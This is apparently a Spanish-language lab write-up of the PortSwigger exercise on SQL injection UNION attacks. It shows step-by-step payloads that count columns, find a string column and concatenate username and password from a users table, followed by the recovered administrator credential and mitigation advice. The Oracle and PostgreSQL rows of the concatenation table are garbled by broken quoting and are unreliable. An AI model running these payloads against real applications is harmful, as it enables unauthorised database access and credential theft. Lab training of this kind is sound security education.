---
title: "SQL injection UNION attack, retrieving multiple values in a single column"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "sql-injection-union-attack-retrieving-multiple-values-in-a-single-column"
author: "Z4k7"
date: "2026-03-02"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "UnionAttack"
  - "Database"
  - "OracleDB"
techniques:
  - "SQLi"
  - "UnionAttack"
  - "Database"
  - "OracleDB"
tools:
  - "Burpsuite"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "La vulnerabilidad de SQL Injection (SQLi) ocurre cuando una aplicación web no valida  correctamente las entradas del usuario antes de construir consultas SQL.   En este caso, el filtro de categorías de productos permite inyectar código SQL arbitrario. El  ataque UNION se utiliza para combinar resultados de múltiples consultas y extraer  información sensible de otras tablas, como credenciales de usuarios."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, lo que permite usar un ataque UNION para recuperar datos de otras tablas.
          La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`.
          Para resolver el laboratorio, realice un ataque UNION de inyección SQL que recupere todos los nombres de usuario y contraseñas, y use la información para iniciar sesión como `administrator`usuario

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma la inyección:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142644931.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La aplicación acepta el comentario SQL, confirmando que la entrada se concatena directamente en la consulta."
      - kind: "note"
        text: |
          Determinación del número de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2-- -- Éxito
          '+ORDER+BY+1,2,3-- -- Error
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260311152437572.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se confirma que la consulta original devuelve 2 columnas."

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Prueba con UNION SELECT:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL--   -- Error
          UNION SELECT NULL,NULL--   -- Éxito
          UNION SELECT NULL,NULL,NULL--   -- Error
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260311152518555.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El ataque UNION requiere exactamente 2 columnas."
      - kind: "note"
        text: |
          Identificación de columna compatible con datos de cadena:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT 'a',NULL-- -- Error 
          UNION SELECT NULL,'a'-- -- Éxito 
          UNION SELECT 'a','a'-- -- Error
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260311152559823.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La columna 2 acepta datos de tipo cadena."
      - kind: "note"
        text: |
          podemos obtener la información de la BD en este caso requerimos concatenar dos datos en solo una consulta

  - id: "step4"
    num: "04"
    title: "Consulta multi respuestas"
    content:
      - kind: "note"
        text: |
          Para recuperar mutiles resultados en solo una consulta   podremos aplicar  el filtro de comparación en este caso  `|| '~' ||`  A continuación se emplea una comparación del código de la consulta  loanterior es una iopcionpara concatenar los datros pero no funcioan para todos los motores
      - kind: "table"
        headers:
          - "BD"
          - "Concatenacion"
        rows:
          - ["Orácle", "'foo'\", "\", "'bar'"]
          - ["Microsoft", "'foo'+'bar'"]
          - ["PostgreSQL", "'foo'\", "\", "'bar'"]
          - ["MySQL", "'foo' 'bar' ==Tenga en cuenta el espacio entre las dos cadenas==<br>CONCAT('foo','bar')"]
      - kind: "note"
        text: |
          La tabla anterior son las opciones que se utilizan para concatenar dependiendo del motor de BD que se usa
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL,username ||'~'|| password FROM users--
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260311152847366.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se recuperan los pares `username~password` de la tabla `users`."
      - kind: "note"
        text: |
          Credenciales obtenidas:
          `administrator`~`2aeme2oe4v02hmiarb2z`
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyección%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151544808.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Autenticación exitosa como `administrator`."

lessons:
  - 'En auditorías, siempre probar con `ORDER BY` y `UNION SELECT` para determinar columnas y tipos de datos.'
  - 'En exámenes de certificación, recordar que el paso crítico es identificar el número de columnas y la columna compatible con cadenas.'
  - 'Como mentor: documentar cada paso con evidencia visual y técnica fortalece la comprensión y la capacidad de replicar el ataque en entornos controlados.'
mitigation:
  - 'Implementar prepared statements y consultas parametrizadas.'
  - 'Validar y sanitizar entradas de usuario.'
  - 'Configurar WAF para detectar patrones de `UNION SELECT`.'
  - 'Revisar logs de base de datos en busca de consultas anómalas.'
  - 'Aplicar el principio de menor privilegio en cuentas de base de datos.'
---
